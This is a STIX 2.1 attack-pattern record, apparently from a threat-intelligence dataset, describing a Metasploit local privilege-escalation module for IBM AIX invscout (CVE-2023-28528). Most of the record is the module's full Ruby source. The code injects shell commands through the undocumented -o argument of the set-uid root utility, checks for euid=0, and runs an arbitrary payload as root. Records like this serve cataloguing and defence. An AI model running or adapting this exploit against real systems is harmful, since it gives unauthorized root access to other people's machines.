{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--769a05bc-448d-43c9-a7d2-60e67f0de7d9",
    "created": "2024-08-14T16:56:50.573683Z",
    "modified": "2024-08-14T16:56:50.573687Z",
    "name": "invscout RPM Privilege Escalation",
    "description": " This module exploits a command injection vulnerability in IBM AIX invscout set-uid root utility present in AIX 7.2 and earlier.  The undocumented -rpm argument can be used to install an RPM file; and the undocumented -o argument passes arguments to the rpm utility without validation, leading to command injection with effective-uid root privileges.  This module has been tested successfully on AIX 7.2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/aix/local/invscout_rpm_priv_esc.rb",
            "external_id": "invscout_rpm_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-28528"
        },
        {
            "source_name": "reference",
            "url": "https://talosintelligence.com/vulnerability_reports/TALOS-2023-1691"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'invscout RPM Privilege Escalation',\n        'Description' => %q{\n          This module exploits a command injection vulnerability in IBM AIX\n          invscout set-uid root utility present in AIX 7.2 and earlier.\n\n          The undocumented -rpm argument can be used to install an RPM file;\n          and the undocumented -o argument passes arguments to the rpm utility\n          without validation, leading to command injection with effective-uid\n          root privileges.\n\n          This module has been tested successfully on AIX 7.2.\n        },\n        'Author' => [\n          'Tim Brown', # Discovery and PoC\n          'bcoles' # Metasploit\n        ],\n        'References' => [\n          ['CVE', '2023-28528'],\n          ['URL', 'https://talosintelligence.com/vulnerability_reports/TALOS-2023-1691'],\n        ],\n        'Platform' => %w[unix aix],\n        'Arch' => ARCH_CMD,\n        'Payload' => {\n          'BadChars' => \"\\x00\\x0a\\x0d\\x22\",\n          'Compat' => {\n            'PayloadType' => 'cmd',\n            'RequiredCmd' => 'generic telnet openssl'\n          }\n        },\n        'DefaultOptions' => {\n          'PrependSetresuid' => true,\n          'PrependSetresgid' => true,\n          'PrependFork' => true\n        },\n        'SessionTypes' => %w[shell meterpreter],\n        'Targets' => [['Automatic', {}]],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-04-24',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('INVSCOUT_PATH', [true, 'Path to invscout executable', '/usr/sbin/invscout'])\n    ])\n  end\n\n  def invscout_path\n    datastore['INVSCOUT_PATH']\n  end\n\n  def check\n    return CheckCode::Safe(\"#{invscout_path} is not executable\") unless executable?(invscout_path)\n\n    res = execute_command('id')\n    id = res.to_s.scan(/^(.*?uid=.*?)$/).flatten.first.to_s\n\n    return CheckCode::Safe(\"#{invscout_path} is not vulnerable.\") unless id.include?('euid=0')\n\n    CheckCode::Vulnerable(\"Output: #{id}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    rpm_path = \"#{Rex::Text.rand_text_alphanumeric(8..12)}.rpm\"\n    rpm_args = \"; #{cmd}; echo \"\n    res = cmd_exec(\"#{invscout_path} -RPM #{rpm_path} -o \\\"#{rpm_args}\\\"\")\n    vprint_line(res) unless res.blank?\n    res\n  end\n\n  def exploit\n    execute_command(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-04-24",
    "x_mitre_platforms": [
        "%w[unix aix]"
    ]
}